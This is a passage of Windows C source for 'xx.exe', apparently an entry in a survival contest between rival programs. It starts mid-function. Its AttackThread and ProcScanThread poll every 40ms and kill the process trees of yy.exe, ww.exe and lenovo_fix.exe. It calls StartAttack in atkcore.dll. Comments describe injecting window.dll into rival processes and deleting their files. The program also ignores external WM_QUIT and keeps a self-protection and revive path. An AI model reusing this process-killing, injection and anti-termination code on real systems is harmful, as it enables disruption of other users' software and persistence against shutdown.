    static const WCHAR *targets[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
    UNREFERENCED_PARAMETER(lpParam);
    WriteLog(L"进程名扫描线程启动（yy.exe / ww.exe / lenovo_fix.exe，40ms 一轮）");

    for (;;) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32W pe = { sizeof(pe) };
            DWORD self = GetCurrentProcessId();
            if (Process32FirstW(hSnap, &pe)) {
                do {
                    int i;
                    if (pe.th32ProcessID <= 4 || pe.th32ProcessID == self) continue;
                    for (i = 0; targets[i]; i++) {
                        if (_wcsicmp(pe.szExeFile, targets[i]) != 0) continue;
                        WriteLog(L"进程名命中 %ls PID=%lu -> 结束整棵进程树",
                                 pe.szExeFile, pe.th32ProcessID);
                        if (EnsureKillTreeFn()) g_pfnKillTree(pe.th32ProcessID);
                        else {
                            HANDLE hk = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                            if (hk) { TerminateProcess(hk, 0); CloseHandle(hk); }
                        }
                        break;
                    }
                } while (Process32NextW(hSnap, &pe));
            }
            CloseHandle(hSnap);
        }
        Sleep(40);       /* <50ms */
    }
    return 0;
}

static DWORD WINAPI AttackThread(LPVOID lpParam)
{
    UNREFERENCED_PARAMETER(lpParam);
    WriteLog(L"Attack thread starting...");

    WCHAR ownSuffix[MAX_WND_SUFFIX] = { 0 };
    HANDLE hMap = OpenFileMappingW(FILE_MAP_READ, FALSE, SHARED_MEM_NAME);
    if (hMap) {
        void *pView = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, SHARED_MEM_SIZE);
        if (pView) {
            WCHAR *pSuffix = (WCHAR *)((BYTE *)pView + OFFSET_WND_SUFFIX);
            wcsncpy_s(ownSuffix, MAX_WND_SUFFIX, pSuffix, _TRUNCATE);
            UnmapViewOfFile(pView);
        }
        CloseHandle(hMap);
    }

    WCHAR killPath[MAX_PATH] = L"";
    HMODULE hKill = LoadOurModuleEx(L"atkcore.dll", killPath, MAX_PATH);
    WriteLog(L"atkcore.dll 路径: %ls", killPath[0] ? killPath : L"(未加载)");
    PushNamesToModule(hKill);
    if (hKill) {
        typedef void (WINAPI *StartAttack_t)(void);
        StartAttack_t pStart = (StartAttack_t)XXGetProcByName(hKill, "StartAttack");
        if (pStart) {
            pStart();
            WriteLog(L"atkcore.dll StartAttack called");
        }
        g_pfnKillTree = (XxKillTree_t)XXGetProcByName(hKill, "XxKillTree");
        if (!g_pfnKillTree) WriteLog(L"!! atkcore XxKillTree 导出缺失（旧 dll）-> 窗口命中时只能单进程 Terminate");
    }

    WriteLog(L"窗口扫描线程启动（窗口只用于发现，杀由 atkcore 的 XxKillTree 统一做）");

    while (1) {
        HWND hWnd = GetTopWindow(NULL);
        while (hWnd) {
            if (!IsWindow(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }
            if (!IsWindowVisible(hWnd)) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            WCHAR cls[128] = { 0 };
            GetClassNameW(hWnd, cls, _countof(cls));

            DWORD pid = 0;
            GetWindowThreadProcessId(hWnd, &pid);
            if (pid == 0) { hWnd = GetNextWindow(hWnd, GW_HWNDNEXT); continue; }

            /* 别打自己人的窗口。**不能**用"该进程里有我们的 window 模块"判断：
               我们会把 window.dll 注入进 yy 的子进程（蜜罐 lenovo_fix.exe），
               那样它的窗口会被误判成我方窗口直接跳过 —— 实测它的标题一直没人动就是这么来的。
               改成：类名符合我方格式 `wnd_<16hex>`，或这个句柄正登记在弹窗持有者表里。 */
            if (pid == GetCurrentProcessId() || IsOurOwnPopupWindow(hWnd, cls)) {
                hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
                continue;
            }

            BOOL bTarget = FALSE, bYyWin = FALSE;
            HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
            if (hProc) {
                WCHAR path[MAX_PATH];
                DWORD size = MAX_PATH;
                if (QueryFullProcessImageNameW(hProc, 0, path, &size)) {
                    WCHAR *pName = wcsrchr(path, L'\\');
                    if (pName) pName++; else pName = path;
                    if (_wcsicmp(pName, L"yy.exe") == 0 || _wcsicmp(pName, L"ww.exe") == 0)
                        bTarget = TRUE;
                }
                CloseHandle(hProc);
            }
            if (!bTarget) {
                /* 正判据：yy 的窗口特征（改名过的副本也带这些特征） */
                WCHAR wtitle[256] = L"";
                GetWindowTextW(hWnd, wtitle, _countof(wtitle));
                if (wcsstr(cls, L"YYWnd") || wcscmp(wtitle, L"YY_Defensive_GUI") == 0)
                    bYyWin = TRUE;
            }
            WCHAR enemyCls[128], enemyTitle[256];
            wcscpy_s(enemyCls, _countof(enemyCls), cls);
            GetWindowTextW(hWnd, enemyTitle, _countof(enemyTitle));

            /* 新规则：
               **本体（yy.exe/ww.exe）只嘲讽、不压制** —— atkcore 的 waste 模仿线程要往它的
               日志框里连发 10 条嘲讽，一旦我们隐藏/挂到不可见父窗口/最小化，嘲讽就没人看得见；
               10 条发完后由 atkcore 结束它的进程树并锁死删除源文件。
               **子进程（蜜罐 lenovo_fix.exe 等）**照常压制（改标题/隐藏/挂父窗口/最小化），
               因为它们接下来会被直接杀掉+锁死+删除，死之前也别让它发出存活证明。 */
            /* 只做"窗口 → PID → 结束整棵进程树"。
               改标题 / 隐藏 / 挂不可见父窗口 / 最小化 / 建假窗口 全部删掉：
               那些跨进程窗口操作既费时又几乎没有实际收益（用户实测）。 */
            if (bTarget || bYyWin) {
                WriteLog(L"窗口命中 PID=%lu cls=%ls -> 结束整棵进程树", pid, cls);
                if (g_pfnKillTree) g_pfnKillTree(pid);
                else {
                    HANDLE hk = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
                    if (hk) { TerminateProcess(hk, 0); CloseHandle(hk); }
                }
            }

            hWnd = GetNextWindow(hWnd, GW_HWNDNEXT);
        }
        /* 降低 xx.exe 自身窗口扫描频率：攻击负荷在被注入的副本里，这里 300ms 足够 */
        Sleep(40);      /* 攻击频率 <50ms */
    }
    return 0;
}
/* ================== 主入口 ================== */
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    UNREFERENCED_PARAMETER(hInstance);
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);
    UNREFERENCED_PARAMETER(nCmdShow);


    InitializeCriticalSection(&g_csLog);
    WriteLog(L"==== xx.exe 启动 build=v11 (verified-load / async-tree-kill / reviver) ====");
    ParseReviveArgs();
    if (g_bReviveMode) RunReviver();     /* 复活器：只复活 xx，不接管；函数内 ExitProcess */

    /* Step 1: start attack immediately */
    /* 两条攻击线程并行：
       ① ProcScanThread：按进程名找 yy.exe / ww.exe / lenovo_fix.exe（不依赖窗口）
       ② AttackThread  ：枚举窗口找 yy（能抓"改了名但窗口特征还在"的副本） */
    HANDLE hProcScanThread = CreateThread(NULL, 0, ProcScanThread, NULL, 0, NULL);
    if (hProcScanThread) {
        CloseHandle(hProcScanThread);
        WriteLog(L"ProcScan thread started（按进程名扫描 40ms）");
    }
    HANDLE hAttackThread = CreateThread(NULL, 0, AttackThread, NULL, 0, NULL);
    if (hAttackThread) {
        CloseHandle(hAttackThread);
        WriteLog(L"Attack thread started first");
    }

    /* Step 2: **初始化内联执行**（不再交给工作线程）：
       工作线程一旦被挂起/卡住，window.dll 就永远加载不上 —— 表现就是
       "进程活着、只有主线程能打日志、屏幕上没有弹窗"。 */
    WriteLog(L"Init: begin");
    InitThread(NULL);
    WriteLog(L"Init: done");

    /* Step 3: self-protection (maintain xx.exe backup) */
    HANDLE hSelfThread = CreateThread(NULL, 0, SelfProtectThread, NULL, 0, NULL);
    if (hSelfThread) {
        CloseHandle(hSelfThread);
        WriteLog(L"Self-protect thread started");
    }

    WriteLog(L"Entering message loop");

    /* message loop + periodic alive log */
    DWORD dwLastTick = GetTickCount();
    MSG msg;

    while (1) {
        // 处理消息
        while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
            /* 外部 PostThreadMessage(WM_QUIT) 会让 PeekMessage 直接返回 WM_QUIT，
               一条消息就能让 xx 退出并触发复活/共享内存连锁，故直接吞掉
               （与 window.dll 消息循环同一策略）。 */
            if (msg.message == WM_QUIT) {
                WriteLog(L"ignored external WM_QUIT");
                continue;
            }
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }


        // 定期写入存活日志
        if (GetTickCount() - dwLastTick > 5000) {
            WriteLog(L"XX alive, PID: %lu", GetCurrentProcessId());
            dwLastTick = GetTickCount();
        }
        Sleep(1000);
    }

    /* 循环不会自行退出：xx.exe 只能被外部结束（这是存活竞赛的要求）。
       以下收尾代码保留，仅在被编译器优化掉的极端路径下才可能到达。 */
    DeleteCriticalSection(&g_csLog);
    if (g_pSharedView) UnmapViewOfFile(g_pSharedView);
    if (g_hSharedMem) CloseHandle(g_hSharedMem);
    if (g_hHeartbeatEvent) CloseHandle(g_hHeartbeatEvent);
    return 0;
}



























